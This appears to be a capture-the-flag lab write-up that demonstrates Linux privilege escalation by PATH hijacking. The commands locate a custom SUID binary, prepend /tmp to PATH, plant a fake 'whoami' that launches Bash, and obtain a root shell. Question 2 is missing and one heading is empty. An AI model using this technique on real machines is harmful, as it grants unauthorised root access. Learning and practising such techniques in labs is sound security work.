### Question 1 — Find a custom SUID binary on the target host, using the techniques you learned before. What is the full path of this binary?

Ran the same SUID search used on the earlier machines:

```shell
john@path-box:~$ find / -perm -04000 -type f -ls  2>/dev/null

   512340     16 -rwsr-xr-x   1 root     root        16104 Apr 27  2026 /opt/path/mywhoami
      850     84 -rwsr-xr-x   1 root     root        85064 Feb  6  2024 /snap/core20/2379/usr/bin/chfn
      856     52 -rwsr-xr-x   1 root     root        53040 Feb  6  2024 /snap/core20/2379/usr/bin/chsh
      926     87 -rwsr-xr-x   1 root     root        88464 Feb  6  2024 /snap/core20/2379/usr/bin/gpasswd
     1010     55 -rwsr-xr-x   1 root     root        55528 Apr  9  2024 /snap/core20/2379/usr/bin/mount
—SNIP—
```

**Breakdown:**

- `find` searches the filesystem; `/` starts the search at the root directory
- `-perm -04000` matches files with the SUID bit set
- `-type f` restricts matches to regular files
- `-ls` lists each match in long-listing detail
- `2>/dev/null` discards error output from directories that can't be read

Everything under `/snap/core20/...` is part of the base Ubuntu Core snap image rather than something custom to this box. `/opt/path/mywhoami` stands out as the one binary living outside the standard system paths, which marks it as the custom SUID binary planted for this exercise.

**Answer:** `/opt/path/mywhoami`

**Breakdown:**

### Question 3 — Exploit this behavior as you've seen in the example scenario, to hijack the PATH and gain root privileges. What are the contents of /root/flag.txt?

With `mywhoami` confirmed to call a bare `whoami` through `system()`, the next step was finding a writable directory to plant a fake `whoami` in:

```shell
john@path-box:~$ find / -type d -writable 2>/dev/null | sort -u

/dev/mqueue
/dev/shm

/run/user/1001/systemd/inaccessible
/run/user/1001/systemd/propagate
/run/user/1001/systemd/propagate/.os-release-stage

/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
/var/crash
/var/tmp
/var/tmp/cloud-init
```

**Breakdown:**

- `find / -type d -writable 2>/dev/null` lists writable directories, as covered in the previous task
- `| sort -u` sorts the results and removes duplicates

As before, `/tmp` was the natural pick, so it was prepended to `PATH`:

```shell
john@path-box:~$ export PATH=/tmp:$PATH
```

A fake `whoami` was then planted there, pointing at Bash:

```shell
john@path-box:/tmp$ echo "/bin/bash" > whoami

john@path-box:/tmp$ cat whoami

/bin/bash
john@path-box:/tmp$ chmod 777 whoami
```

**Breakdown:**

- `echo "/bin/bash" > whoami` writes the line `/bin/bash` into a new file named `whoami`
- `cat whoami` confirms the file's contents
- `chmod 777 whoami` makes the file readable, writable, and executable by everyone

With `/tmp` ahead of the rest of `PATH` and a fake `whoami` sitting in it, running the SUID binary triggered the hijack:

```shell
john@path-box:/tmp$ cd /opt/path/

john@path-box:/opt/path$ ./mywhoami

root@path-box:/opt/path# 
```

**Breakdown:**

- `cd /opt/path/` moves into the directory holding the SUID binary
- `./mywhoami` runs it; internally it calls `setuid(0)`/`setgid(0)` then `system("whoami")`, and with `/tmp` searched first, that `system()` call runs the planted Bash script instead of the real `whoami`, inheriting root's privileges in the process

From the resulting root shell, the flag was read:

```shell
root@path-box:/opt/path# cat /root/flag.txt

—REDACTED—
```

**Answer:** `—REDACTED—`
